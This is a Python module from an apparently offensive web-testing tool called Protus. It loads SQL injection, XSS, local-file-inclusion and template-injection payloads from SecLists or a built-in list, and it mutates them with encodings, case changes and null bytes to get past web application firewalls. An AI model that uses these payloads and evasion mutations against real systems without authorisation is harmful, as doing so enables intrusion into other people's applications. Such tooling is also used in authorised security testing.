# Protus/core/payloads.py
"""
PAYLOAD ENGINE - Dynamic payload loading and mutation.
Integrates with SecLists and provides context-aware payload generation.

Features:
- Lazy loading from wordlists (no 10k payloads in memory)
- Mutation engine (encoding chains, case variations)
- Context-specific generators (SQL, XSS, LFI, SSTI)
- WAF bypass mutations
"""
import os
import random
import urllib.parse
from typing import Generator, List, Optional, Dict, Callable
from dataclasses import dataclass
from pathlib import Path

# Local logging fallback for Protus
def log_info(msg: str):
    print(f"[+] {msg}")

def log_warning(msg: str):
    print(f"[!] {msg}")

# ═══════════════════════════════════════════════════════════════════════════════
#  WORDLIST PATHS (SecLists integration)
# ═══════════════════════════════════════════════════════════════════════════════

# Default paths for SecLists
SECLISTS_PATHS = [
    "/usr/share/seclists",
    "/opt/seclists",
    "C:\\seclists",
    os.path.expanduser("~/seclists"),
    os.path.expanduser("~/.seclists"),
]

# We will look in local first, then SecLists
WORDLIST_PATHS = {
    "sqli": ["sqli.txt", "Fuzzing/SQLi/Generic-SQLi.txt", "Fuzzing/Databases/MySQL.txt"],
    "xss": ["xss.txt", "Fuzzing/XSS/XSS-Jhaddix.txt", "Fuzzing/XSS/xss-payload-list.txt"],
    "lfi": ["lfi.txt", "Fuzzing/LFI/LFI-gracefulsecurity-linux.txt"],
    "ssti": ["ssti.txt", "Fuzzing/template-engines-expression.txt"],
}

def get_local_payloads_dir() -> str:
    """Gets the path to the internal payloads directory."""
    # This will resolve to Protus/payloads
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "payloads")

def find_seclists() -> Optional[str]:
    """Find SecLists installation path."""
    for path in SECLISTS_PATHS:
        if os.path.isdir(path):
            return path
    return None


def load_wordlist(category: str, max_lines: int = 5000) -> List[str]:
    """
    Load payloads from internal directory or SecLists wordlists.
    Falls back to built-in if neither is found.
    """
    payloads = []
    
    # 1. Try to load from our internal /payloads directory first
    local_dir = get_local_payloads_dir()
    if os.path.isdir(local_dir):
        # We expect files like sqli.txt, xss.txt, lfi.txt
        local_file = os.path.join(local_dir, f"{category}.txt")
        if os.path.isfile(local_file):
            try:
                with open(local_file, 'r', encoding='utf-8', errors='ignore') as f:
                    for i, line in enumerate(f):
                        if i >= max_lines:
                            break
                        line = line.strip()
                        if line and not line.startswith('--') and not line.startswith('#'):
                            payloads.append(line)
            except Exception as e:
                log_warning(f"Failed to read local wordlist: {e}")

    # 2. Try to load from SecLists if we don't have local payloads
    if not payloads:
        seclists = find_seclists()
        if seclists and category in WORDLIST_PATHS:
            for rel_path in WORDLIST_PATHS[category]:
                full_path = os.path.join(seclists, rel_path)
                if os.path.isfile(full_path):
                    try:
                        with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                            for i, line in enumerate(f):
                                if i >= max_lines:
                                    break
                                line = line.strip()
                                if line and not line.startswith('#') and not line.startswith('--'):
                                    payloads.append(line)
                    except Exception:
                        pass
    
    # 3. Fall back to built-in if no external found
    if not payloads:
        payloads = BUILTIN_PAYLOADS.get(category, [])
        if not payloads:
            log_warning(f"No payloads found for '{category}'. Install SecLists or populate internal /payloads.")
    
    return payloads


def stream_wordlist(category: str) -> Generator[str, None, None]:
    """
    Stream payloads from wordlist (lazy loading).
    Memory efficient for large wordlists.
    """
    local_dir = get_local_payloads_dir()
    local_file = os.path.join(local_dir, f"{category}.txt")
    has_streamed = False

    if os.path.isfile(local_file):
        try:
            with open(local_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#') and not line.startswith('--'):
                        has_streamed = True
                        yield line
        except Exception:
            pass
    
    if not has_streamed:
        seclists = find_seclists()
        if seclists and category in WORDLIST_PATHS:
            for rel_path in WORDLIST_PATHS[category]:
                full_path = os.path.join(seclists, rel_path)
                if os.path.isfile(full_path):
                    try:
                        with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                            for line in f:
                                line = line.strip()
                                if line and not line.startswith('#') and not line.startswith('--'):
                                    yield line
                    except Exception:
                        pass
        
        # Fall back to built-in
        for payload in BUILTIN_PAYLOADS.get(category, []):
            yield payload


# ═══════════════════════════════════════════════════════════════════════════════
#  BUILT-IN PAYLOADS (fallback)
# ═══════════════════════════════════════════════════════════════════════════════

BUILTIN_PAYLOADS = {
    "sqli": [
        "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
        "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--",
        "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    ],
    "xss": [
        "<script>alert(1)</script>", "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    ],
    "lfi": [
        "../../../etc/passwd", "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\win.ini",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
    ],
}


# ═══════════════════════════════════════════════════════════════════════════════
#  MUTATION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class MutationConfig:
    """Configuration for payload mutations."""
    url_encode: bool = True
    double_encode: bool = True
    case_variation: bool = True
    null_byte: bool = True
    comment_injection: bool = True
    unicode: bool = True
    max_mutations: int = 5


def mutate_payload(payload: str, config: MutationConfig = None) -> Generator[str, None, None]:
    """
    Generate mutations of a payload for WAF bypass.
    Yields original first, then mutations.
    """
    if config is None:
        config = MutationConfig()
    
    yield payload  # Original first
    mutations_count = 0
    
    if config.url_encode and mutations_count < config.max_mutations:
        yield urllib.parse.quote(payload)
        mutations_count += 1
    
    if config.double_encode and mutations_count < config.max_mutations:
        yield urllib.parse.quote(urllib.parse.quote(payload))
        mutations_count += 1
    
    if config.case_variation and mutations_count < config.max_mutations:
        mutated = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
        if mutated != payload:
            yield mutated
            mutations_count += 1
    
    if config.null_byte and mutations_count < config.max_mutations:
        yield payload + "%00"
        yield payload + "\x00"
        mutations_count += 2


def generate_sqli_payloads(count: int = 100, mutate: bool = True) -> Generator[str, None, None]:
    """Generate SQLi payloads with optional mutations."""
    base_payloads = load_wordlist("sqli", max_lines=count)
    for payload in base_payloads:
        if mutate:
            for mutated in mutate_payload(payload, MutationConfig(max_mutations=3)):
                yield mutated
        else:
            yield payload


def generate_xss_payloads(context: str = "html", count: int = 100) -> Generator[str, None, None]:
    base = load_wordlist("xss", max_lines=count)
    wrappers = {
        "html": [("", ""), ("-->", "<!--"), ("</script>", "<script>")],
        "attribute": [("\" ", ""), ("' ", ""), ("\" onmouseover=\"", "")],
    }
    for payload in base:
        yield payload
        for prefix, suffix in wrappers.get(context, []):
            yield f"{prefix}{payload}{suffix}"


def generate_lfi_payloads(os_type: str = "linux", count: int = 100) -> Generator[str, None, None]:
    base = load_wordlist("lfi", max_lines=count)
    for payload in base:
        if os_type == "linux" and "\\" in payload:
            continue
        if os_type == "windows" and "/etc/" in payload:
            continue
        yield payload


# ═══════════════════════════════════════════════════════════════════════════════
#  PAYLOAD STATISTICS
# ═══════════════════════════════════════════════════════════════════════════════

def get_payload_stats() -> Dict[str, int]:
    """Get statistics about available payloads."""
    seclists = find_seclists()
    stats = {"seclists_found": seclists is not None}
    
    for category in ["sqli", "xss", "lfi", "ssti"]:
        payloads = load_wordlist(category, max_lines=100000)
        stats[category] = len(payloads)
    
    return stats


def print_payload_stats():
    """Print payload statistics to console."""
    stats = get_payload_stats()
    
    print("\n[  Payload Arsenal Status  ]")
    print(f"{'Category':<10} | {'Count':<8} | {'Primary Source'}")
    print("-" * 45)
    
    # We check if local dir works before checking SecLists
    local_dir = get_local_payloads_dir()
    source_msg = "Local/Built-in"
    if stats["seclists_found"]:
        source_msg = "Local/SecLists"
        
    for category in ["sqli", "xss", "lfi", "ssti"]:
        count = stats.get(category, 0)
        print(f"{category.upper():<10} | {count:<8} | {source_msg}")
    
    print()
